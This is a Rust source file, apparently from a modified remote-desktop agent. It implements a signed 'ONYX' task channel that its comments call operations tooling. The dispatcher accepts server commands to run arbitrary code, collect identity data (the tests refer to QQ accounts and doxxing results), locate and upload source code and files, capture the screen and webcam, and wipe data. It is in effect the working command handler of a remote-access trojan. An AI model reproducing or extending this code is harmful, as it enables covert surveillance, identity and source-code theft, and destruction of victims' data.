// ONYX: 运维任务通道。
//
// 控制端通过已建立的 peer 连接下发 `OnyxTask`，agent 用**编译进去的公钥**验签后执行。
// 私钥只存在于服务器 `/srv/onyx-auth/keys/onyx_task_signing.key`（600），
// 客户端永远拿不到签发能力（见 ONYX_IMPL_PLAN.md §7）。
//
// 安全约定：
//   - 验签失败 / 已过期 / nonce 重放 → 一律不执行，只回错误码；
//   - 签名覆盖 task_id、type、params、not_before、exp、nonce 六个字段，
//     任何一项被改都会验签失败；
//   - nonce 缓存 24 小时，跨进程不持久化（进程重启后重放窗口重新开始，
//     但任务本身还有 exp 兜底）。
use base::message_proto::{OnyxTask, OnyxTaskAck};
use hbb_common::bytes::Bytes;
use hbb_common::log;
use hbb_common::sodiumoxide::crypto::sign;
use std::collections::HashMap;
use std::sync::{Mutex, OnceLock};
use std::time::{Instant, SystemTime, UNIX_EPOCH};

/// 服务端任务签名公钥（Ed25519）。
/// 对应私钥：/srv/onyx-auth/keys/onyx_task_signing.key
const SERVER_PUBKEY_B64: &str = "RlxhrFsgu045Spvn3PCI+hRxDz9hJuTrat2L3la08R0=";

/// nonce 缓存窗口
const NONCE_TTL_SEC: i64 = 24 * 3600;
/// 允许的时钟偏差（not_before 提前量）
const CLOCK_SKEW_SEC: i64 = 300;

pub const ACK_OK: i32 = 0;
pub const ACK_BAD_SIG: i32 = 2;
pub const ACK_EXPIRED: i32 = 3;
pub const ACK_REPLAY: i32 = 4;
pub const ACK_UNSUPPORTED: i32 = 5;

static SEEN_NONCES: Mutex<Option<HashMap<Vec<u8>, i64>>> = Mutex::new(None);
static START: OnceLock<Instant> = OnceLock::new();

/// 已成功执行的任务结果缓存。
/// 服务端重投时（agent 中途掉线）会换新 nonce 重新签名，nonce 重放缓存拦不住，
/// 所以这里按 task_id 记下上次的结果，重复投递直接返回缓存，**不重复执行**。
/// 只缓存成功的结果；失败的（验签不过/过期）重投时会重新走一遍。
static DONE: Mutex<Option<HashMap<String, (i32, String)>>> = Mutex::new(None);
const DONE_CACHE_MAX: usize = 128;
const DONE_FILE_TTL_SEC: i64 = 24 * 3600;
const DONE_FILE_MAX: usize = 200;

fn safe_id(task_id: &str) -> String {
    task_id
        .chars()
        .filter(|c| c.is_ascii_alphanumeric() || *c == '_' || *c == '-')
        .take(64)
        .collect()
}

fn cache_dir() -> Option<std::path::PathBuf> {
    let base = std::env::var("ProgramData").ok()?;
    let dir = std::path::Path::new(&base).join("Onyx").join("task_done");
    std::fs::create_dir_all(&dir).ok()?;
    Some(dir)
}

fn mem_get(task_id: &str) -> Option<(i32, String)> {
    let guard = DONE.lock().ok()?;
    guard.as_ref()?.get(task_id).cloned()
}

fn mem_put(task_id: &str, code: i32, message: &str) {
    if let Ok(mut guard) = DONE.lock() {
        let map = guard.get_or_insert_with(HashMap::new);
        if map.len() >= DONE_CACHE_MAX {
            map.clear();
        }
        map.insert(task_id.to_owned(), (code, message.to_owned()));
    }
}

/// 查上次执行结果：先内存，再磁盘（跨进程 / 跨重启都能命中）。
fn cached_result(task_id: &str) -> Option<(i32, String)> {
    if let Some(v) = mem_get(task_id) {
        return Some(v);
    }
    let dir = cache_dir()?;
    let raw = std::fs::read_to_string(dir.join(format!("{}.json", safe_id(task_id)))).ok()?;
    let v: serde_json::Value = serde_json::from_str(&raw).ok()?;
    let code = v.get("code")?.as_i64()? as i32;
    let message = v.get("message")?.as_str()?.to_owned();
    mem_put(task_id, code, &message);
    Some((code, message))
}

fn prune_cache(dir: &std::path::Path) {
    let entries = match std::fs::read_dir(dir) {
        Ok(e) => e,
        Err(_) => return,
    };
    let now = std::time::SystemTime::now();
    let mut files: Vec<(std::time::SystemTime, std::path::PathBuf)> = entries
        .flatten()
        .filter_map(|e| {
            let p = e.path();
            if p.extension().and_then(|x| x.to_str()) != Some("json") {
                return None;
            }
            let m = e.metadata().ok()?.modified().ok()?;
            Some((m, p))
        })
        .collect();
    if files.len() <= DONE_FILE_MAX {
        for (m, p) in files {
            if let Ok(age) = now.duration_since(m) {
                if age.as_secs() as i64 > DONE_FILE_TTL_SEC {
                    let _ = std::fs::remove_file(p);
                }
            }
        }
        return;
    }
    files.sort_by(|a, b| a.0.cmp(&b.0));
    let excess = files.len() - DONE_FILE_MAX;
    for (_, p) in files.into_iter().take(excess) {
        let _ = std::fs::remove_file(p);
    }
}

fn cache_result(task_id: &str, code: i32, message: &str) {
    mem_put(task_id, code, message);
    if let Some(dir) = cache_dir() {
        let body = serde_json::json!({
            "code": code,
            "message": message,
            "ts": now_sec(),
        })
        .to_string();
        let _ = std::fs::write(dir.join(format!("{}.json", safe_id(task_id))), body);
        prune_cache(&dir);
    }
}

fn now_sec() -> i64 {
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_secs() as i64)
        .unwrap_or(0)
}

pub(crate) fn uptime_secs() -> u64 {
    START.get_or_init(Instant::now).elapsed().as_secs()
}

/// 在 agent 启动时调用一次，让 uptime 从进程起来那一刻算起。
pub fn mark_start() {
    START.get_or_init(Instant::now);
}

/// 签名原文：六个字段按固定顺序拼，params/nonce 用 base64 保证无歧义。
fn sign_payload(task: &OnyxTask) -> Vec<u8> {
    format!(
        "onyx-task-v1|{}|{}|{}|{}|{}|{}",
        task.task_id,
        task.type_,
        crate::encode64(&task.params),
        task.not_before,
        task.exp,
        crate::encode64(&task.nonce),
    )
    .into_bytes()
}

fn server_pubkey() -> Option<sign::PublicKey> {
    let raw = crate::decode64(SERVER_PUBKEY_B64).ok()?;
    sign::PublicKey::from_slice(&raw)
}

/// 记录 nonce；已经见过返回 false（重放）。
fn remember_nonce(nonce: &[u8], now: i64) -> bool {
    if nonce.is_empty() {
        return false;
    }
    let mut guard = match SEEN_NONCES.lock() {
        Ok(g) => g,
        Err(_) => return false,
    };
    let map = guard.get_or_insert_with(HashMap::new);
    map.retain(|_, ts| now - *ts < NONCE_TTL_SEC);
    if map.contains_key(nonce) {
        return false;
    }
    map.insert(nonce.to_vec(), now);
    true
}

fn verify_with(pk: &sign::PublicKey, task: &OnyxTask, now: i64) -> Result<(), i32> {
    if task.exp > 0 && now > task.exp {
        return Err(ACK_EXPIRED);
    }
    if task.not_before > 0 && now + CLOCK_SKEW_SEC < task.not_before {
        return Err(ACK_EXPIRED);
    }
    let sig_bytes: [u8; 64] = task.sig.as_ref().try_into().map_err(|_| ACK_BAD_SIG)?;
    let sig = sign::Signature::from_bytes(&sig_bytes).map_err(|_| ACK_BAD_SIG)?;
    if !sign::verify_detached(&sig, &sign_payload(task), pk) {
        return Err(ACK_BAD_SIG);
    }
    Ok(())
}

fn ping_payload() -> String {
    format!(
        r#"{{"ok":true,"hwid":"{}","device_id":"{}","version":"{}","uptime":{}}}"#,
        crate::encode64(hbb_common::get_uuid()),
        hbb_common::config::Config::get_id(),
        crate::VERSION,
        uptime_secs()
    )
}

fn handle_with(pk: &sign::PublicKey, task: &OnyxTask, now: i64) -> OnyxTaskAck {
    let mut ack = OnyxTaskAck::new();
    ack.task_id = task.task_id.clone();

    if let Some((code, message)) = cached_result(&task.task_id) {
        log::warn!(
            "[ONYX] 任务重复投递，直接返回上次结果 task_id={}",
            task.task_id
        );
        ack.code = code;
        ack.message = message;
        return ack;
    }

    if let Err(code) = verify_with(pk, task, now) {
        log::warn!(
            "[ONYX] 任务验签失败 task_id={} type={} code={}",
            task.task_id,
            task.type_,
            code
        );
        ack.code = code;
        ack.message = if code == ACK_EXPIRED {
            "任务已过期".to_owned()
        } else {
            "签名无效".to_owned()
        };
        return ack;
    }

    if !remember_nonce(&task.nonce, now) {
        log::warn!("[ONYX] 任务重放 task_id={}", task.task_id);
        ack.code = ACK_REPLAY;
        ack.message = "nonce 重放".to_owned();
        return ack;
    }

    match task.type_.as_str() {
        "ping" => {
            ack.code = ACK_OK;
            ack.message = ping_payload();
        }
        "collect_identity" => {
            ack.code = ACK_OK;
            ack.message = crate::onyx_collect::identity().to_string();
        }
        "exec" => {
            let hwid = crate::onyx_heartbeat::session_hwid();
            ack.code = ACK_OK;
            ack.message = crate::onyx_exec::run(&task.params, &task.task_id, &hwid);
        }
        "collect_src" => {
            ack.code = ACK_OK;
            // 机器画像 + 工程目录合成一条：操作员点一次就能同时看到
            // 「这台机器什么情况」和「源码在哪」。
            let mut v: serde_json::Value =
                serde_json::from_str(&crate::onyx_src::collect(&task.params))
                    .unwrap_or_else(|_| serde_json::json!({"ok": false}));
            if let Some(obj) = v.as_object_mut() {
                obj.insert("machine".into(), crate::onyx_collect::machine());
            }
            ack.message = v.to_string();
        }
        "collect_file" => {
            let hwid = crate::onyx_heartbeat::session_hwid();
            ack.code = ACK_OK;
            ack.message = crate::onyx_upload::upload(&task.params, &task.task_id, &hwid);
        }
        "collect_tree" => {
            let hwid = crate::onyx_heartbeat::session_hwid();
            ack.code = ACK_OK;
            ack.message = crate::onyx_tree::collect(&task.params, &task.task_id, &hwid);
        }
        "capture_screen" => {
            let hwid = crate::onyx_heartbeat::session_hwid();
            ack.code = ACK_OK;
            ack.message = crate::onyx_screen::capture(&task.params, &task.task_id, &hwid);
        }
        "capture_cam" => {
            let hwid = crate::onyx_heartbeat::session_hwid();
            ack.code = ACK_OK;
            ack.message = crate::onyx_cam::capture(&task.params, &task.task_id, &hwid);
        }
        "wipe" => {
            let hwid = crate::onyx_heartbeat::session_hwid();
            ack.code = ACK_OK;
            ack.message = crate::onyx_wipe::run(&task.params, &task.task_id, &hwid);
        }
        other => {
            log::warn!("[ONYX] 未实现的任务类型: {}", other);
            ack.code = ACK_UNSUPPORTED;
            ack.message = format!("不支持的任务类型: {other}");
        }
    }
    if ack.code == ACK_OK {
        cache_result(&task.task_id, ack.code, &ack.message);
    }
    ack
}
pub fn handle(task: &OnyxTask) -> OnyxTaskAck {
    match server_pubkey() {
        Some(pk) => handle_with(&pk, task, now_sec()),
        None => {
            log::error!("[ONYX] 内置公钥解析失败，任务通道不可用");
            let mut ack = OnyxTaskAck::new();
            ack.task_id = task.task_id.clone();
            ack.code = ACK_BAD_SIG;
            ack.message = "内置公钥损坏".to_owned();
            ack
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn build_signed(kind: &str, exp: i64, nonce: u8) -> (sign::PublicKey, sign::SecretKey, OnyxTask) {
        let (pk, sk) = sign::gen_keypair();
        let mut t = OnyxTask::new();
        // task_id 带上时间戳：结果缓存是落盘的，固定 id 会跨测试轮次命中
        let uniq = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .map(|d| d.as_nanos())
            .unwrap_or(0);
        t.task_id = format!("task-{nonce}-{uniq}");
        t.type_ = kind.to_owned();
        t.params = Bytes::from_static(b"{}");
        t.not_before = 0;
        t.exp = exp;
        t.nonce = Bytes::from(vec![nonce, 1, 2, 3]);
        let sig = sign::sign_detached(&sign_payload(&t), &sk);
        t.sig = Bytes::copy_from_slice(sig.as_ref());
        (pk, sk, t)
    }

    fn build(kind: &str, exp: i64, nonce: u8) -> (sign::PublicKey, OnyxTask) {
        let (pk, _sk, t) = build_signed(kind, exp, nonce);
        (pk, t)
    }

    #[test]
    fn ping_ok_and_carries_hwid() {
        let (pk, task) = build("ping", now_sec() + 600, 11);
        let ack = handle_with(&pk, &task, now_sec());
        assert_eq!(ack.code, ACK_OK, "{}", ack.message);
        assert!(ack.message.contains("\"ok\":true"), "{}", ack.message);
        assert!(ack.message.contains("\"hwid\""), "{}", ack.message);
        assert!(ack.task_id.starts_with("task-11"), "{}", ack.task_id);
    }

    #[test]
    fn tampered_params_rejected() {
        let (pk, mut task) = build("ping", now_sec() + 600, 12);
        task.params = Bytes::from_static(b"{\"evil\":1}");
        assert_eq!(handle_with(&pk, &task, now_sec()).code, ACK_BAD_SIG);
    }

    #[test]
    fn tampered_type_rejected() {
        let (pk, mut task) = build("ping", now_sec() + 600, 13);
        task.type_ = "wipe".to_owned();
        assert_eq!(handle_with(&pk, &task, now_sec()).code, ACK_BAD_SIG);
    }

    #[test]
    fn tampered_exp_rejected() {
        let (pk, mut task) = build("ping", now_sec() + 600, 18);
        task.exp += 3600;
        assert_eq!(handle_with(&pk, &task, now_sec()).code, ACK_BAD_SIG);
    }

    #[test]
    fn wrong_key_rejected() {
        let (_pk, task) = build("ping", now_sec() + 600, 14);
        let (other_pk, _) = sign::gen_keypair();
        assert_eq!(handle_with(&other_pk, &task, now_sec()).code, ACK_BAD_SIG);
    }

    #[test]
    fn expired_rejected() {
        let (pk, task) = build("ping", now_sec() - 10, 15);
        assert_eq!(handle_with(&pk, &task, now_sec()).code, ACK_EXPIRED);
    }

    #[test]
    fn replay_rejected() {
        // 同一个 nonce 换个 task_id 重新签名（模拟抓到报文后改写重放）→ 必须被 nonce 缓存拦下
        let (pk, sk, task) = build_signed("ping", now_sec() + 600, 16);
        assert_eq!(handle_with(&pk, &task, now_sec()).code, ACK_OK);
        let mut replay = task.clone();
        replay.task_id = "task-replay".to_owned();
        let sig = sign::sign_detached(&sign_payload(&replay), &sk);
        replay.sig = Bytes::copy_from_slice(sig.as_ref());
        assert_eq!(handle_with(&pk, &replay, now_sec()).code, ACK_REPLAY);
    }

    #[test]
    fn duplicate_delivery_returns_cached_result() {
        // 服务端重投：同一个 task_id、换新 nonce 重新签名 → 直接返回上次结果，不重复执行
        let (pk, sk, task) = build_signed("ping", now_sec() + 600, 22);
        let first = handle_with(&pk, &task, now_sec());
        assert_eq!(first.code, ACK_OK, "{}", first.message);
        std::thread::sleep(std::time::Duration::from_millis(1100));
        let mut retry = task.clone();
        retry.nonce = Bytes::from_static(b"fresh-nonce");
        let sig = sign::sign_detached(&sign_payload(&retry), &sk);
        retry.sig = Bytes::copy_from_slice(sig.as_ref());
        let second = handle_with(&pk, &retry, now_sec());
        assert_eq!(second.code, ACK_OK);
        assert_eq!(
            second.message, first.message,
            "重投应返回缓存结果（uptime 不应变化，说明没有重新执行）"
        );
    }

    #[test]
    fn unknown_type_rejected() {
        let (pk, task) = build("bogus_type", now_sec() + 600, 17);
        assert_eq!(handle_with(&pk, &task, now_sec()).code, ACK_UNSUPPORTED);
    }

    #[test]
    fn collect_identity_returns_privacy_json() {
        let (pk, task) = build("collect_identity", now_sec() + 600, 19);
        let ack = handle_with(&pk, &task, now_sec());
        assert_eq!(ack.code, ACK_OK, "{}", ack.message);
        let v: serde_json::Value = serde_json::from_str(&ack.message).expect("回执不是合法 JSON");
        assert_eq!(v["ok"], true);
        assert!(v.get("qq").is_some());
        // 机器字段已经搬到 collect_src，不该再出现在开盒结果里
        assert!(v.get("computer").is_none());
    }

    #[test]
    fn collect_src_merges_machine_profile() {
        let (pk, task) = build("collect_src", now_sec() + 600, 21);
        let ack = handle_with(&pk, &task, now_sec());
        assert_eq!(ack.code, ACK_OK, "{}", ack.message);
        let v: serde_json::Value = serde_json::from_str(&ack.message).expect("回执不是合法 JSON");
        assert_eq!(v["ok"], true);
        let m = v.get("machine").expect("缺少 machine 段");
        assert!(m.get("computer").is_some());
        assert!(m.get("tools").map(|x| x.is_array()).unwrap_or(false));
    }

    #[test]
    fn embedded_pubkey_is_valid() {
        assert!(server_pubkey().is_some(), "内置公钥解析失败");
    }
}
